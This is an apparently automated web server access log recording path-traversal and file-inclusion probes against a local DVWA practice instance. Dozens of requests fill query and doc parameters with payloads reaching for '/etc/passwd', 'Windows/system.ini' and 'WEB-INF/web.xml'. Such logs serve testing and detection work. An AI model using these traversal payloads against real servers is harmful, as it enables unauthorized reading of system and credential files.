172.17.0.1 - - [12/Feb/2019:08:55:11 +0000] "GET /dvwa/js/?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1315 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=c%3A%2F HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=c%3A%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=%2F HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=c%3A%5C HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=c%3A%5C HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /dvwa/js/dvwaPage.js?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /favicon.ico?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=%2Fetc%2Fpasswd HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=%2Fetc%2Fpasswd HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=c%3A%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=c%3A%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=c%3A%5C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=c%3A%5C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=WEB-INF%2Fweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=WEB-INF%5Cweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /instructions.php?doc=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=c%3A%2F HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=%2F HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=c%3A%5C HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=%2Fetc%2Fpasswd HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=c%3A%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=c%3A%5C HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
